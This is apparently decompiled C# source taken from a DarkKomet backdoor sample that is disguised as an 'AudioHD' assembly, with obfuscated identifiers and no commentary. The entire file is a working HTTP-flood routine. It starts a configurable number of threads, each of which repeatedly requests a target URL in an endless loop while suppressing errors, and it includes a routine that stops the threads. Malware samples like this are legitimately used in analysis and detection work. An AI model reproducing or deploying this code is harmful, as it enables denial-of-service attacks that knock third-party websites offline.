// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System.Net;
using System.Threading;

internal sealed class \u0008\u2000
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  private static \u0008\u2000.\u0002[] \u0008;
  public static int \u0006;
  public static int \u000E;
  public static bool \u000F = false;

  public static void \u0002()
  {
    \u0008\u2000.\u0003 = new Thread[\u0008\u2000.\u0006];
    \u0008\u2000.\u0002 = new ThreadStart[\u0008\u2000.\u0006];
    \u0008\u2000.\u0008 = new \u0008\u2000.\u0002[\u0008\u2000.\u0006];
    if (!\u0008\u2000.\u0005.StartsWith(\u0006\u2002.\u0002(-885878523)))
      \u0008\u2000.\u0005 = \u0006\u2002.\u0002(-885878523) + \u0008\u2000.\u0005;
    for (int index = 0; index < \u0008\u2000.\u0006; ++index)
    {
      \u0008\u2000.\u0008[index] = new \u0008\u2000.\u0002(\u0008\u2000.\u0005);
      \u0008\u2000.\u0002[index] = new ThreadStart(\u0008\u2000.\u0008[index].\u0002);
      \u0008\u2000.\u0003[index] = new Thread(\u0008\u2000.\u0002[index]);
      \u0008\u2000.\u0003[index].Start();
    }
    \u0008\u2000.\u000F = true;
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u0008\u2000.\u0006; ++index)
    {
      try
      {
        \u0008\u2000.\u0003[index].Abort();
        \u0008\u2000.\u0003[index].Join();
      }
      catch
      {
        \u0008\u2000.\u000F = false;
      }
    }
    \u0008\u2000.\u000F = false;
  }

  private sealed class \u0002
  {
    private string \u0002;
    private WebClient \u0003 = new WebClient();

    public \u0002(string _param1) => this.\u0002 = _param1;

    public void \u0002()
    {
      while (true)
      {
        try
        {
          this.\u0003.DownloadString(this.\u0002);
        }
        catch
        {
        }
      }
    }
  }
}
